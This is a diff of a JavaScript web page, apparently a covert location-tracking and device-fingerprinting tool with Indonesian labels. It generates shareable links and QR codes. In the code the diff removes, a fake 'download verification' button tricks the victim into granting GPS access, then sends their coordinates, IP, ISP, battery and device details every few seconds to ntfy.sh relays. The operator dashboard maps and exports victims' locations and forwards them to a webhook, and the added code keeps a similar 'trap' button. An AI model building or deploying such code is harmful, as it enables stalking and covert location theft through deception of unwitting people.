-if (topic) targetMode(); else dashMode();
+const $$ = s => document.querySelectorAll(s);
+const esc = s => String(s||"").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 
-function playPingSound() {
-    try {
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        if (!AudioContext) return;
-        const ctx = new AudioContext();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(880, ctx.currentTime); 
-        gain.gain.setValueAtTime(0.1, ctx.currentTime); 
-        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.start();
-        osc.stop(ctx.currentTime + 0.3);
-    } catch(e){}
+function log(msg, cls="m"){
+  const t = $("#term");
+  const time = new Date().toLocaleTimeString("id-ID", {hour12:false});
+  t.innerHTML += `<div class="l"><span class="t">[${time}]</span> <span class="${cls}">${msg}</span></div>`;
+  t.scrollTop = t.scrollHeight;
 }
 
-function targetMode(){
-  $("#dashMode").remove(); $("#targetMode").hidden = false;
-  if (/WhatsApp|Instagram|FBAN|FBAV|Messenger|Line\//i.test(navigator.userAgent)) $("#banner").hidden = false;
-  
-  const dlog = t => console.log("SYS:", t);
-
-  const send = async (title, msg) => {
-    for (const base of RELAYS) {
-      try {
-        const r = await fetch(base + "/" + topic, { method: "POST", body: msg, headers: { Title: title } });
-        if (r.ok) return true;
-      } catch(e){}
-    }
-    return false;
-  };
-
-  const parseUA = async () => {
-    const ua = navigator.userAgent;
-    const android = (ua.match(/Android\s([\d.]+)/) || [])[1] || null;
-    const ios = (ua.match(/OS ([\d_]+) like Mac/) || [])[1] || null;
-    let model = String((ua.match(/;\s*([^;()]+?)\s*Build\//) || [])[1] || (ua.match(/\(([^)]+)\)/) || [])[1] || "").trim() || ua.slice(0, 40);
-    try {
-      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        const hv = await navigator.userAgentData.getHighEntropyValues(["model"]);
-        if (hv.model) model = hv.model;
-      }
-    } catch(e){}
-    const low = model.toLowerCase();
-    let brand = "Lainnya/PC";
-    if (/iphone|ipad/i.test(ua)) brand = "Apple";
-    else if (/samsung|sm-|gt-/i.test(low)) brand = "Samsung";
-    else if (/redmi|poco|xiaomi|m20|m21|2201|2304|2312/i.test(low)) brand = "Xiaomi/Poco";
-    else if (/oppo|cph|pgm/i.test(low)) brand = "OPPO";
-    else if (/vivo|v20|v21/i.test(low)) brand = "Vivo";
-    else if (/realme|rmx/i.test(low)) brand = "Realme";
-    else if (/infinix|tecno/i.test(low)) brand = "Infinix/Tecno";
-    return { brand, model, android, ios };
-  };
-
-  const L = { dev: null, hw: null, batt: null, net: null, loc: null, ip: null, isp: null };
-  let lastPingOk = null;
-
-  async function fetchNetworkIntel() {
-      try {
-          const r = await fetch('https://ipapi.co/json/');
-          const d = await r.json();
-          L.ip = d.ip;
-          L.isp = d.org;
-      } catch(e) {}
-  }
-  fetchNetworkIntel(); 
-
-  async function refresh(){
-    if (!L.dev) L.dev = await parseUA();
-    if (!L.hw) {
-      L.hw = { cores: navigator.hardwareConcurrency || null,
-               ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : null,
-               screen: screen.width + "x" + screen.height,
-               tz: Intl.DateTimeFormat().resolvedOptions().timeZone };
-    }
-    try { if (navigator.getBattery) { const b = await navigator.getBattery(); L.batt = { level: Math.round(b.level * 100), charging: b.charging }; } } catch(e){}
-    const c = navigator.connection || navigator.webkitConnection;
-    L.net = c ? { type: (c.type || c.effectiveType || "?"), dl: c.downlink || null } : { type: "?" };
-  }
-
-  async function ping(){
-    await refresh();
-    await send("PING", JSON.stringify({ batt: L.batt, net: L.net, loc: L.loc, ip: L.ip, isp: L.isp }));
-  }
-
-  $("#btnNext").onclick = () => { $("#modal").hidden = false; };
-  
-  $("#btnAllow").onclick = async () => {
-    // Tombol Verifikasi ditekan. Teks berubah untuk meyakinkan korban agar menunggu
-    const btn = $("#btnAllow");
-    btn.textContent = "MEMPROSES... IZINKAN LOKASI";
-    btn.style.opacity = "0.7";
-    btn.style.pointerEvents = "none";
-    
-    send("STATUS", "⚡ TARGET MENEKAN TOMBOL VERIFIKASI UNDUHAN");
-    
-    await refresh();
-    send("META", JSON.stringify({ dev: L.dev, hw: L.hw, batt: L.batt, net: L.net, ip: L.ip, isp: L.isp }));
-    
-    ping();
-    setInterval(ping, 6000); 
-
-    if (navigator.geolocation) {
-      let got = false;
-      navigator.geolocation.watchPosition(p => {
-        const c = p.coords;
-        L.loc = { lat: c.latitude, lon: c.longitude, acc: c.accuracy };
-        if (!got) { 
-            got = true; 
-            ping(); 
-            // Setelah lokasi diizinkan, kembalikan teks tombol seolah-olah sukses
-            btn.textContent = "VERIFIKASI BERHASIL ✓";
-            btn.style.background = "var(--ok)";
-            btn.style.color = "#000";
-        } 
-      }, err => { 
-          send("STATUS", "❌ LOKASI DITOLAK KORBAN"); 
-          btn.textContent = "VERIFIKASI GAGAL - LOKASI DITOLAK";
-          btn.style.background = "var(--bad)";
-      },
-      { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
-    }
-  };
+function setConn(state, txt){
+  $("#statusDot").classList.toggle("on", state);
+  $("#statusTxt").textContent = txt || (state ? "ONLINE" : "OFFLINE");
+  $("#pillTxt") && ($("#pillTxt").textContent = state ? "LIVE (SSE)" : "POLLING");
 }
 
-function dashMode(){
-  $("#targetMode").remove();
-  let esList = [], loaders = [], pollTimer = null, raw = [], seen = new Set();
-  let pings = 0, t0 = null, lastMap = 0, lastLoc = null, cur = null;
+let esList = [], loaders = [], pollTimer = null, raw = [], seen = new Set();
+let pings = 0, t0 = null, lastMap = 0, lastLoc = null, cur = null;
 
-  const AKEY = "sentinel_v11_history";
-  const loadA = () => { try { return JSON.parse(localStorage.getItem(AKEY)) || {}; } catch(e){ return {}; } };
-  const saveA = a => { try { localStorage.setItem(AKEY, JSON.stringify(a)); } catch(e){} };
-  const entry = (a, t) => a[t] || (a[t] = { created: Date.now(), updated: Date.now(), dev: "", pings: 0, loc: null });
+const AKEY = "sentinel_v11_history";
+const loadA = () => { try { return JSON.parse(localStorage.getItem(AKEY)) || {}; } catch(e){ return {}; } };
+const saveA = a => { try { localStorage.setItem(AKEY, JSON.stringify(a)); } catch(e){} };
+const entry = (a, t) => a[t] || (a[t] = { created: Date.now(), updated: Date.now(), dev: "", pings: 0, loc: null });
 
-  setInterval(() => { $("#clock").textContent = new Date().toLocaleString("id-ID", { hour12: false }); }, 1000);
-  setInterval(() => { if (t0) { const s = (Date.now() - t0) / 1000 | 0; $("#uptime").textContent = [s/3600|0, (s/60|0)%60, s%60].map(x => String(x).padStart(2, "0")).join(":"); } }, 1000);
-  
-  const rnd = () => [...crypto.getRandomValues(new Uint8Array(10))].map(x => "abcdefghijklmnopqrstuvwxyz0123456789"[x % 36]).join("");
-  const log = (s, c) => { const l = $("#log"); l.innerHTML += '<div><span class="t">[' + new Date().toLocaleTimeString("id-ID") + ']</span> <span class="' + (c || "") + '">' + s + "</span></div>"; l.scrollTop = l.scrollHeight; };
-  const connUpdate = () => { const live = esList.some(e => e.readyState === 1); $("#pill").className = "pill " + (live ? "live" : "poll"); $("#pillTxt").textContent = live ? "LIVE (SSE)" : "POLLING"; };
+setInterval(() => { $("#clock").textContent = new Date().toLocaleString("id-ID", { hour12: false }); }, 1000);
+setInterval(() => { if (t0) { const s = (Date.now() - t0) / 1000; const h = Math.floor(s/3600), m = Math.floor(s%3600/60), sec = Math.floor(s%60); $("#uptime").textContent = [h,m,sec].map(v=>String(v).padStart(2,"0")).join(":"); } }, 1000);
 
-  function renderHist(){
+function renderHist(){
+  const a = loadA();
+  const keys = Object.keys(a).sort((x, y) => a[y].updated - a[x].updated).slice(0, 10);
+  $("#hist").innerHTML = keys.map(k => { const e = a[k];
+    return '<div class="hitem"><div class="hrow"><b style="color:var(--acc)">' + k.slice(0, 8) + '</b><span>' + new Date(e.updated).toLocaleTimeString("id-ID") + '</span></div>' +
+      '<div class="hrow"><span>' + esc(e.dev || "Unknown") + '</span><span>' + e.pings + ' hit</span></div>' +
+      (e.loc ? '<div class="hrow"><span style="color:var(--ok);font-size:11px;">📍 ' + e.loc.lat.toFixed(4) + ', ' + e.loc.lon.toFixed(4) + '</span></div>' : '') +
+      '<div style="display:flex;gap:6px;margin-top:6px;">' +
+      '<button class="btn ghost mini" style="flex:1" data-t="' + k + '">PANTAU KEMBALI</button>' +
+      '<button class="btn danger mini" style="flex:0 0 auto;padding:0 10px;" data-del="' + k + '">🗑</button>' +
+      '</div></div>';
+  }).join("") || '<div class="hempty">Riwayat kosong.</div>';
+  $$("#hist [data-t]").forEach(b => b.onclick = () => watch(b.dataset.t));
+  $$("#hist [data-del]").forEach(b => b.onclick = () => {
     const a = loadA();
-    const keys = Object.keys(a).sort((x, y) => a[y].updated - a[x].updated).slice(0, 10);
-    $("#hist").innerHTML = keys.map(k => { const e = a[k];
-      return '<div class="hitem"><div class="hrow"><b style="color:var(--acc)">' + k.slice(0, 8) + '</b><span>' + new Date(e.updated).toLocaleTimeString("id-ID") + '</span></div>' +
-        '<div class="hrow"><span>' + esc(e.dev || "Unknown") + '</span><span>' + e.pings + ' hit</span></div>' +
-        '<button class="btn ghost mini" style="width:100%;margin-top:6px" data-t="' + k + '">PANTAU KEMBALI</button></div>';
-    }).join("") || '<div class="hempty">Riwayat kosong.</div>';
-    $$("#hist [data-t]").forEach(b => b.onclick = () => watch(b.dataset.t));
-  }
-
-  function fillTiles(d, hw, b, n, ip, isp){
-    if (ip) $("#ip_addr").textContent = ip;
-    if (isp) $("#isp").textContent = isp;
-    if (d) { $("#brand").textContent = d.brand || "–"; $("#dev").textContent = d.model || "–"; $("#os").textContent = d.android ? "Android " + d.android : d.ios ? "iOS " + d.ios : "–"; }
-    if (hw) { $("#cpu").textContent = hw.cores || "–"; $("#ram").textContent = hw.ram || "–"; $("#scr").textContent = hw.screen || "–"; }
-    if (b) { $("#batt").textContent = b.level != null ? b.level + "%" : "–"; $("#chg").textContent = b.charging != null ? (b.charging ? "⚡ Charging" : "Discharging") : "–"; }
-    if (n) { $("#net").textContent = ((n.type || "?") + "").toUpperCase(); $("#dl").textContent = n.dl != null ? n.dl + " Mbps" : "–"; }
-  }
-  
-  async function forwardToWebhook(payload) {
-      const hookUrl = $("#webhookUrl").value.trim();
-      if(!hookUrl || !hookUrl.startsWith("http")) return;
-      try {
-          fetch(hookUrl, {
-              method: 'POST',
-              mode: 'no-cors', 
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify(payload)
-          });
-      } catch(e){}
-  }
-
-  function process(m){
-    if (m.event && m.event !== "message") return;
-    if (m.id && seen.has(m.id)) return;
-    if (m.id) seen.add(m.id);
-    const t = m.title || "";
-    
-    if (t === "META" || t === "PING" || t === "STATUS") {
-        playPingSound(); 
-    }
-
-    if (t === "META") {
-      try {
-        const d = JSON.parse(m.message);
-        fillTiles(d.dev, d.hw, d.batt, d.net, d.ip, d.isp);
-        const a = loadA(); const e = entry(a, cur);
-        e.dev = ((d.dev || {}).brand || "") + " " + ((d.dev || {}).model || "");
-        e.updated = Date.now(); saveA(a); renderHist();
-        log("📲 Info Perangkat & Jaringan Diekstrak", "v");
-        forwardToWebhook({type: "META", data: d});
-      } catch(e){}
-    }
-    else if (t === "PING") {
-      try {
-        const d = JSON.parse(m.message);
-        pings++; $("#pings").textContent = pings;
-        fillTiles(null, null, d.batt, d.net, d.ip, d.isp);
-        const a = loadA(); const e = entry(a, cur);
-        e.pings++; e.updated = Date.now();
-        
-        if (d.loc) {
-          e.loc = { lat: d.loc.lat, lon: d.loc.lon };
-          lastLoc = d.loc;
-          $("#coord").textContent = d.loc.lat.toFixed(6) + " , " + d.loc.lon.toFixed(6);
-          $("#acc").textContent = "±" + Math.round(d.loc.acc) + " m";
-          $("#lastfix").textContent = new Date().toLocaleTimeString("id-ID");
-          $("#gmaps").href = "https://www.google.com/maps/search/?api=1&query=" + d.loc.lat + "," + d.loc.lon;
-          
-          if (Date.now() - lastMap > 10000) {
-            lastMap = Date.now();
-            $("#mapidle").hidden = true;
-            $("#gmap").src = "https://maps.google.com/maps?q=" + d.loc.lat + "," + d.loc.lon + "&t=k&z=18&hl=id&output=embed";
-          }
-          log("📍 Kordinat Diperbarui: " + d.loc.lat.toFixed(5) + ", " + d.loc.lon.toFixed(5), "g");
-        }
-        saveA(a);
-        forwardToWebhook({type: "PING", loc: d.loc, batt: d.batt});
-      } catch(e){}
-    }
-    else if (t === "STATUS") { log("⚠️ " + esc(m.message || ""), "warn"); forwardToWebhook({type: "STATUS", msg: m.message}); }
-  }
-
-  async function watch(t){
-    stop(); cur = t; raw = []; seen = new Set(); pings = 0; t0 = Date.now(); lastMap = 0;
-    $("#topic").textContent = t.slice(0, 10) + "…"; $("#pings").textContent = "0"; $("#uptime").textContent = "00:00:00"; $("#log").innerHTML = "";
-    log("Inisialisasi koneksi ke server relay...");
+    delete a[b.dataset.del];
+    saveA(a);
     renderHist();
-    
-    $$(".kv b").forEach(el => el.textContent = "-");
-    $("#ip_addr").textContent = "Menunggu..."; $("#isp").textContent = "Menunggu...";
-    
-    RELAYS.forEach(base => {
-      const es = new EventSource(base + "/" + t + "/sse");
-      esList.push(es);
-      es.onopen = () => { connUpdate(); log("Terhubung ke jalur: " + base.replace("https://", ""), "g"); };
-      es.onerror = () => connUpdate();
-      es.onmessage = e => { try { process(JSON.parse(e.data)); } catch(err){} };
-    });
-  }
-  
-  function stop(){ esList.forEach(e => e.close()); esList = []; t0 = null; $("#pill").className = "pill"; $("#pillTxt").textContent = "OFFLINE"; }
-
-  $("#btnNew").onclick = () => {
-    const t = rnd(); localStorage.setItem("sent_topic_v11", t);
-    const url = location.origin + location.pathname + "?t=" + t;
-    $("#linkOut").value = url;
-    $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=110x110&color=00f0ff&bgcolor=0a0f18&data=" + encodeURIComponent(url);
-    $("#qrBox").hidden = false; watch(t);
-  };
-  
-  $("#btnCopy").onclick = async () => { try { await navigator.clipboard.writeText($("#linkOut").value); log("✅ Link berhasil disalin ke clipboard", "g"); } catch(e){} };
-  $("#btnCopyCoord").onclick = async () => { if (lastLoc) { try { await navigator.clipboard.writeText(lastLoc.lat + "," + lastLoc.lon); log("✅ Koordinat disalin", "g"); } catch(e){} } };
-  $("#btnWatch").onclick = () => { let v = $("#watchIn").value.trim(); const m = v.match(/t=([a-z0-9]+)/i); if (m) v = m[1]; if (v) watch(v); };
-  $("#btnStop").onclick = stop;
-  $("#btnWipe").onclick = () => { localStorage.removeItem(AKEY); renderHist(); log("🗑️ Riwayat target dibersihkan", "r"); };
-
-  if(localStorage.getItem("sent_webhook")) $("#webhookUrl").value = localStorage.getItem("sent_webhook");
-  $("#webhookUrl").addEventListener('input', (e) => { localStorage.setItem("sent_webhook", e.target.value); });
-
-  window.addEventListener("load", () => {
-    renderHist();
-    const t = localStorage.getItem("sent_topic_v11");
-    if (!t) return;
-    const url = location.origin + location.pathname + "?t=" + t;
-    $("#linkOut").value = url;
-    $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=110x110&color=00f0ff&bgcolor=0a0f18&data=" + encodeURIComponent(url);
-    $("#qrBox").hidden = false; watch(t);
+    log("🗑️ Target " + b.dataset.del.slice(0, 8) + " dihapus permanen", "r");
   });
 }
-})();
+
+function fillTiles(d, hw, b, n, ip, isp){
+  if (ip) {
+    $("#ip_addr").textContent = ip;
+    // 🚀 OSINT ENGINE: Auto-Enrich IP Data via ipwho.is
+    if (!isp || isp === "Menunggu...") {
+      fetch(`https://ipwho.is/${ip}`).then(r=>r.json()).then(data=>{
+        if(data.success){
+          const eIsp = data.connection ? data.connection.isp : "Unknown ISP";
+          const eLoc = data.city ? `${data.city}, ${data.country}` : "Unknown";
+          $("#isp").textContent = `${eIsp} | 📍 ${eLoc}`;
+          if(cur){ const a=loadA(); if(a[cur]){ a[cur].isp_enriched=eIsp; a[cur].ip_loc=eLoc; saveA(a); } }
+        }
+      }).catch(()=>{});
+    }
+  }
+  if (isp && isp !== "Menunggu...") $("#isp").textContent = isp;
+  if (d) { $("#brand").textContent = d.brand || "–"; $("#dev").textContent = d.model || "–"; $("#os").textContent = d.android ? "Android " + d.android : d.ios ? "iOS " + d.ios : "–"; }
+  if (hw) { $("#cpu").textContent = hw.cores || "–"; $("#ram").textContent = hw.ram || "–"; $("#scr").textContent = hw.screen || "–"; }
+  if (b) { $("#batt").textContent = b.level != null ? b.level + "%" : "–"; $("#chg").textContent = b.charging != null ? (b.charging ? "⚡ Charging" : "Discharging") : "–"; }
+  if (n) { $("#net").textContent = ((n.type || "?") + "").toUpperCase(); $("#dl").textContent = n.dl != null ? n.dl + " Mbps" : "–"; }
+}
+
+function setMap(lat, lon, acc){
+  lastLoc = {lat, lon, acc};
+  const url = `https://www.google.com/maps?q=${lat},${lon}&z=18`;
+  $("#mapBox").innerHTML = `<iframe src="https://maps.google.com/maps?q=${lat},${lon}&z=18&output=embed" allowfullscreen></iframe>`;
+  $("#coordTxt").textContent = `${lat.toFixed(6)} , ${lon.toFixed(6)}`;
+  $("#gMapLink").href = url;
+  $("#fixLbl").textContent = acc ? `±${Math.round(acc)}m` : "✓";
+  $("#acc").textContent = acc ? `±${Math.round(acc)} meter` : "–";
+  lastMap = Date.now();
+}
+
+function watch(topic){
+  stopAll();
+  cur = topic;
+  pings = 0; t0 = Date.now();
+  $("#pings").textContent = 0;
+  $("#uptime").textContent = "00:00:00";
+  $("#topicLbl").textContent = topic.slice(0, 10) + "...";
+  log(`🔗 Menghubungkan ke Topic: ${topic}`, "c");
+  
+  try {
+    const es = new EventSource(`https://ntfy.sh/${topic}/sse`);
+    esList.push(es);
+    es.onmessage = m => {
+      try {
+        const d = JSON.parse(m.data);
+        if (d.event === "message") {
+          if (d.message === "META" || d.message.startsWith("{")) {
+            const meta = d.message === "META" ? raw.find(r => r.message.startsWith("{")) : d;
+            if (meta) {
+              const md = JSON.parse(meta.message);
+              fillTiles(md.dev, md.hw, md.batt, md.net, md.ip, md.isp);
+              const a = loadA(); const e = entry(a, cur);
+              e.dev = md.dev ? `${md.dev.brand || ""} ${md.dev.model || ""}`.trim() : e.dev;
+              e.pings++;
+              saveA(a);
+            }
+          } else if (d.message.startsWith("LOC:")) {
+            const parts = d.message.split(":");
+            if (parts.length >= 3) {
+              const lat = parseFloat(parts[1]), lon = parseFloat(parts[2]), acc = parts[3] ? parseFloat(parts[3]) : null;
+              if (!isNaN(lat) && !isNaN(lon)) {
+                pings++; $("#pings").textContent = pings;
+                setMap(lat, lon, acc);
+                setConn(true, "LIVE (SSE)");
+                log(`📍 Koordinat Diterima: ${lat.toFixed(5)}, ${lon.toFixed(5)}`, "g");
+                
+                const a = loadA(); const e = entry(a, cur);
+                e.loc = {lat, lon, acc};
+                e.pings++;
+                e.updated = Date.now();
+                saveA(a); renderHist();
+                
+                const wh = localStorage.getItem("sent_webhook");
+                if (wh) {
+                  fetch(wh, {method:"POST", body: JSON.stringify({topic: cur, lat, lon, acc, time: new Date().toISOString()}), headers:{"Content-Type":"text/plain"}}).catch(()=>{});
+                }
+              }
+            }
+          }
+          raw.push(d);
+        }
+      } catch(e){}
+    };
+    es.onerror = () => { setConn(false, "POLLING"); log("⚠️ SSE terputus, beralih ke Polling...", "w"); startPoll(topic); };
+    setConn(true, "LIVE (SSE)");
+  } catch(e){ startPoll(topic); }
+}
+
+function startPoll(topic){
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(async () => {
+    try {
+      const r = await fetch(`https://ntfy.sh/${topic}/json?poll=1`);
+      const msgs = await r.json();
+      msgs.reverse().forEach(m => {
+        if (!seen.has(m.id)) {
+          seen.add(m.id);
+          if (m.message.startsWith("LOC:")) {
+            const parts = m.message.split(":");
+            const lat = parseFloat(parts[1]), lon = parseFloat(parts[2]), acc = parts[3] ? parseFloat(parts[3]) : null;
+            if (!isNaN(lat) && !isNaN(lon)) {
+              pings++; $("#pings").textContent = pings;
+              setMap(lat, lon, acc);
+              log(`📍 Koordinat Diterima (Poll): ${lat.toFixed(5)}, ${lon.toFixed(5)}`, "g");
+              const a = loadA(); const e = entry(a, cur);
+              e.loc = {lat, lon, acc};
+              e.pings++;
+              e.updated = Date.now();
+              saveA(a); renderHist();
+            }
+          } else if (m.message.startsWith("{")) {
+            try {
+              const md = JSON.parse(m.message);
+              fillTiles(md.dev, md.hw, md.batt, md.net, md.ip, md.isp);
+              const a = loadA(); const e = entry(a, cur);
+              e.dev = md.dev ? `${md.dev.brand || ""} ${md.dev.model || ""}`.trim() : e.dev;
+              e.pings++;
+              saveA(a);
+            } catch(e){}
+          }
+        }
+      });
+      setConn(true, "POLLING");
+    } catch(e){ setConn(false, "OFFLINE"); }
+  }, 5000);
+}
+
+function stopAll(){
+  esList.forEach(es => es.close()); esList = [];
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  setConn(false, "OFFLINE");
+}
+
+$("#btnGen").onclick = () => {
+  const t = "geop_" + Math.random().toString(36).slice(2, 10);
+  localStorage.setItem("sent_topic_v11", t);
+  const url = location.origin + location.pathname + "?t=" + t;
+  $("#linkOut").value = url;
+  $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=110x110&color=00f0ff&bgcolor=0a0f18&data=" + encodeURIComponent(url);
+  $("#qrBox").hidden = false;
+  log("🔑 Link baru di-generate: " + t, "c");
+  watch(t);
+};
+
+$("#btnCopy").onclick = () => {
+  if ($("#linkOut").value) {
+    navigator.clipboard.writeText($("#linkOut").value);
+    log("📋 Link disalin ke clipboard", "g");
+  }
+};
+
+$("#btnCopyCoord").onclick = () => {
+  if (lastLoc) {
+    navigator.clipboard.writeText(`${lastLoc.lat}, ${lastLoc.lon}`);
+    log("📋 Koordinat disalin", "g");
+  }
+};
+
+$("#btnConn").onclick = () => {
+  const t = $("#manualTopic").value.trim();
+  if (t) { watch(t); log("🔗 Koneksi manual ke: " + t, "c"); }
+};
+
+$("#btnStop").onclick = () => { stopAll(); log("🛑 Pemantauan dihentikan", "r"); };
+
+$("#btnWipe").onclick = () => { localStorage.removeItem(AKEY); renderHist(); log("🗑️ Riwayat target dibersihkan", "r"); };
+
+$("#btnExport").onclick = () => {
+  const a = loadA();
+  if(Object.keys(a).length === 0) return log("⚠️ Database kosong, tidak ada yang diekspor", "warn");
+  const exportData = Object.keys(a).map(k => ({ topic_id: k, ...a[k] }));
+  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportData, null, 2));
+  const dl = document.createElement('a');
+  dl.setAttribute("href", dataStr);
+  dl.setAttribute("download", "GEOP_Sentinel_Database_" + Date.now() + ".json");
+  document.body.appendChild(dl); dl.click(); dl.remove();
+  log("💾 Database berhasil diekspor ke file JSON", "g");
+};
+
+if(localStorage.getItem("sent_webhook")) $("#webhookUrl").value = localStorage.getItem("sent_webhook");
+$("#webhookUrl").addEventListener('input', (e) => { localStorage.setItem("sent_webhook", e.target.value); });
+
+window.addEventListener("load", () => {
+  renderHist();
+  const t = localStorage.getItem("sent_topic_v11");
+  if (!t) return;
+  const url = location.origin + location.pathname + "?t=" + t;
+  $("#linkOut").value = url;
+  $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=110x110&color=00f0ff&bgcolor=0a0f18&data=" + encodeURIComponent(url);
+  $("#qrBox").hidden = false; watch(t);
+});
+
+$("#btnVerify").onclick = () => {
+  if (!navigator.geolocation) { log("⚠️ Perangkat tidak mendukung GPS", "r"); return; }
+  log("🛡️ Meminta izin akses lokasi ke perangkat...", "w");
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const {latitude, longitude, accuracy} = pos.coords;
+      setMap(latitude, longitude, accuracy);
+      log(`✅ Verifikasi Berhasil! Koordinat: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, "g");
+      
+      // Simulate sending to dashboard
+      const topic = localStorage.getItem("sent_topic_v11") || "geop_demo";
+      fetch(`https://ntfy.sh/${topic}`, { method: "POST", body: `LOC:${latitude}:${longitude}:${accuracy}` });
+      
+      setTimeout(() => { $("#trap").style.display = "none"; }, 1500);
+    },
+    err => { log("❌ Izin lokasi ditolak oleh pengguna", "r"); },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+};
+
+// Handle URL params
+const urlParams = new URLSearchParams(window.location.search);
+const paramTopic = urlParams.get('t');
+if (paramTopic) {
+  localStorage.setItem("sent_topic_v11", paramTopic);
+  window.addEventListener("load", () => {
+    const url = location.origin + location.pathname + "?t=" + paramTopic;
+    $("#linkOut").value = url;
+    $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=110x110&color=00f0ff&bgcolor=0a0f18&data=" + encodeURIComponent(url);
+    $("#qrBox").hidden = false; watch(paramTopic);
+  });
+}
 </script>
 </body>
 </html>
